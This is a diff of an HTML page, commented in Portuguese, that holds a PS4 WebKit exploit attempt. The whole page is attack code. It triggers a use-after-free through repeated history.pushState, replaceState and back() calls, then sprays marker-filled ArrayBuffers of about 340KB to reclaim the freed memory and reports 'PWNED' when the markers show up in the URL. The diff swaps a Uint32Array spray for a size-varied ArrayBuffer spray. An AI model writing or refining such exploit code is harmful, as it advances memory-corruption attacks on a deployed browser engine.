@@ -1,26 +1,25 @@
-
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit - Raw Buffer Reclaim</title>
+<title>PS4 WebKit - ArrayBuffer Reclaim (340KB)</title>
 <style>
-    body { background-color: #000; color: #ffcc00; font-family: monospace; padding: 20px; }
+    body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }
     button { 
         padding: 20px; width: 100%; margin-bottom: 10px;
         font-weight: bold; font-size: 16px; cursor: pointer; 
-        border: 2px solid #fc0; background: #330; color: #fff;
+        border: 2px solid #0f0; background: #004400; color: #fff;
         text-transform: uppercase;
     }
     #log { border: 1px solid #555; margin-top: 20px; padding: 10px; white-space: pre-wrap; height: 350px; overflow-y: scroll;}
-    .success { color: #000; background-color: #ffcc00; padding: 5px; font-weight: bold;}
+    .success { color: #fff; background-color: #008800; padding: 5px; font-weight: bold;}
 </style>
 </head>
 <body>
-<h2>PS4 WebKit - Raw Buffer Reclaim (PSFree Style)</h2>
-<div id="status">Mantendo UAF original. Spray via TypedArray.</div>
+<h2>PS4 WebKit - ArrayBuffer Reclaim (340KB Target)</h2>
+<div id="status">Estratégia: Raw Buffer (psfree style)</div>
 
-<button onclick="runRawExploit()">INICIAR RECLAIM (RAW BUFFER)</button>
+<button onclick="runBufferExploit()">INICIAR RECLAIM (340KB)</button>
 
 <div id="log"></div>
 
@@ -38,73 +37,70 @@ function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
 var keepAlive = [];
 
-async function runRawExploit() {
+async function runBufferExploit() {
     logEl.innerHTML = "";
     keepAlive = []; 
-    statusEl.innerText = "Preparando...";
+    statusEl.innerText = "Rodando...";
 
-    // === PREPARAÇÃO (BASEADA NO PSFREE) ===
-    // Criamos buffers brutos que não sofrem conversão de encoding.
-    // Alvo: 680.644 bytes.
-    // Uint32Array usa 4 bytes por elemento.
+    // === CONFIGURAÇÃO BASEADA NO SEU DIAGNÓSTICO ===
+    // Buraco confirmado: 340.356 bytes.
+    // Estratégia: Usar ArrayBuffer puro (sem conversão de string).
+    const TARGET_SIZE = 340356;
     
-    const TARGET_BYTES = 680644;
-    const ELEMENTS = Math.floor(TARGET_BYTES / 4);
-    
-    log(`1. Preparando estratégia Raw Buffer...`);
-    log(`Alvo: ${TARGET_BYTES} bytes`);
-    log(`Elementos Uint32: ${ELEMENTS}`);
-
-    // === FASE 1: TRIGGER UAF (INTACTO COMO VOCÊ PEDIU) ===
-    log("2. Disparando UAF Original...");
+    log("1. Disparando UAF Original...");
     
     let size = 977;
     const STEP = 14461;
 
+    // Loop do UAF Intacto
     for(let i = 0; i < 48; i++) {
-        // String 'V' original
         let frag = "V".repeat(size); 
         history.pushState({}, "", "#" + frag);
-        // O replaceState libera a memória anterior
         history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
         
-        if(i % 6 === 0) {
-            // Gatilho assíncrono
-            setTimeout(() => history.back(), 0);
-        }
+        if(i % 6 === 0) setTimeout(() => history.back(), 0);
         
-        // MOMENTO CRÍTICO: Na última volta, fazemos o spray IMEDIATO
-        // Sem sleep, sem espera. Velocidade pura.
-        if(i === 47) {
-            log(">>> SPRAYING RAW BUFFERS NOW <<<");
-            doRawSpray(ELEMENTS);
+        // Na última volta, fazemos o spray IMEDIATAMENTE após o back() ser agendado
+        if (i === 47) {
+             log(">>> SPRAY ARRAYBUFFER (340KB +/- variação) <<<");
+             // Executa spray síncrono para tentar pegar a memória no ato
+             doBufferSpray(TARGET_SIZE);
         } else {
-            size += STEP;
-            await sleep(5);
+             size += STEP;
+             await sleep(5);
         }
     }
     
     await sleep(200);
 
-    // === FASE 3: VERIFICAÇÃO ===
+    // === VERIFICAÇÃO ===
     checkResult();
 }
 
-function doRawSpray(elements) {
-    // Cria 500 buffers de exatamente 680KB.
-    // Preenche com 0x41414141 ('AAAA') para ser visível na URL.
-    for(let i=0; i < 500; i++) {
+function doBufferSpray(targetSize) {
+    // Tenta cobrir a diferença de headers entre StringImpl e ArrayBufferContents
+    // Varia o tamanho de -128 a +128 bytes
+    for(let delta = -128; delta <= 128; delta += 8) {
         try {
-            let buf = new Uint32Array(elements);
-            // Preenche apenas o começo para ser rápido, ou tudo se preferir robustez
-            // buf.fill(0x41414141) é mais lento, vamos preencher só cabeçalhos
-            buf[0] = 0x41414141; 
-            buf[1] = 0x42424242;
-            // Preenche o meio também, onde a URL costuma ler
-            let mid = Math.floor(elements / 2);
-            buf[mid] = 0x43434343;
+            let trySize = targetSize + delta;
             
-            keepAlive.push(buf);
+            // Técnica do psfree.mjs: Uint8Array sobre ArrayBuffer
+            let buf = new ArrayBuffer(trySize);
+            let view = new Uint8Array(buf);
+            
+            // Preenche o início e o fim com marcadores 'A' (0x41)
+            // Não preenchemos tudo para ser rápido (O(1))
+            view[0] = 0x41;
+            view[1] = 0x41;
+            view[2] = 0x41;
+            view[3] = 0x41;
+            
+            // Preenche o meio (onde a URL provavelmente lê)
+            let mid = Math.floor(trySize / 2);
+            view[mid] = 0x41;
+            view[mid+1] = 0x41;
+            
+            keepAlive.push(view);
         } catch(e) {}
     }
 }
@@ -115,31 +111,23 @@ function checkResult() {
     let changed = false;
     let sample = "";
     
-    // Procura por qualquer byte que não seja 'V' (0x56) ou caracteres de URL normais
-    // Se o Uint32Array ocupou, veremos 'A', 'B' ou 'C' (0x41, 0x42, 0x43)
+    // Procura por 'A' (0x41)
     for(let i=1000; i<5000; i++) {
-        let c = url.charCodeAt(i);
-        if(c === 0x41 || c === 0x42 || c === 0x43) {
+        if(url.charCodeAt(i) === 0x41) { 
             changed = true;
-            sample = "Encontrado marcador: 0x" + c.toString(16);
+            sample = "Encontrado 'AAAA' no offset " + i;
             break;
-        }
-        // Backup: se qualquer coisa mudar drasticamente
-        if(c !== 0x56 && c !== 0x25) { // Ignora V e %
-             // Check visual manual no log
         }
     }
 
     if(changed) {
         log("!!! JACKPOT !!!", "success");
-        log("Raw Buffer Spray funcionou!");
+        log("ArrayBuffer ocupou a memória!");
         log(sample);
-        statusEl.innerText = "PWNED: RAW BUFFER";
-        statusEl.style.backgroundColor = "#ffcc00";
-        statusEl.style.color = "#000";
+        statusEl.innerText = "PWNED";
     } else {
         log("Falha: Ainda vendo 'V'.");
-        log("Nota: Tentei usar ArrayBuffer direto como o psfree.mjs faz.");
+        log("Tamanho do buffer testado: ~" + 340356 + " bytes");
     }
 }
 </script>
